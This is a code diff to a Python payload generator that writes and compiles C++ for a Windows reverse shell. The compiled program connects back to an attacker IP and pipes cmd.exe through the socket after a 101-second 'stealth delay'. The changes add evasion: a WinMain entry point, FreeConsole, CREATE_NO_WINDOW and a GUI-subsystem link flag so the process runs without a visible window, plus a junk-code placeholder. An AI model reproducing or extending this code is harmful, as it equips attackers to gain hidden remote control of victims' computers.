@@ -27,15 +27,17 @@ def generate_cpp_source(ip, port):
 
 {junk}
 
-int main() {{
-    // 1. STEALTH DELAY (101 Seconds)
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {{
+
+    FreeConsole();
+    // STEALTH DELAY (101 Seconds)
     Sleep(101000); 
 
-    // 2. WINSOCK STARTUP
+    // WINSOCK STARTUP
     WSADATA wsaData;
     WSAStartup(MAKEWORD(2,2), &wsaData);
 
-    // 3. CREATE WINDOWS SOCKET
+    // CREATE WINDOWS SOCKET
     SOCKET sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
     
     struct sockaddr_in serv_addr;
@@ -45,7 +47,7 @@ int main() {{
     // This is your Mac's IP address (the Attacker)
     serv_addr.sin_addr.s_addr = inet_addr("192.168.64.1");
 
-    // 4. CONNECT BACK TO MAC
+    // CONNECT BACK TO MAC
     if (WSAConnect(sock, (SOCKADDR*)&serv_addr, sizeof(serv_addr), NULL, NULL, NULL, NULL) == 0) {{
         STARTUPINFOA si = {{0}};
         PROCESS_INFORMATION pi = {{0}};
@@ -56,7 +58,7 @@ int main() {{
         si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
 
         char cmd[] = "cmd.exe"; 
-        CreateProcessA(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
+        CreateProcessA(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
     }}
     return 0;
 }}
@@ -72,7 +74,11 @@ def compile_payload(output_name):
     
     # We combine the setup script AND the compile command into one string
     # The '&&' means "if the first part works, do the second part"
-    compile_cmd = f'"{vcvars_path}" && cl /O2 /Fe:{output_name} payload.cpp user32.lib ws2_32.lib'
+    compile_cmd = (
+    f'"{vcvars_path}" && '
+    f'cl /O2 /Fe:{output_name} payload.cpp user32.lib ws2_32.lib '
+    f'/link /SUBSYSTEM:WINDOWS /ENTRY:WinMainCRTStartup'
+    )
     
     result = subprocess.run(compile_cmd, capture_output=True, text=True, shell=True)
     
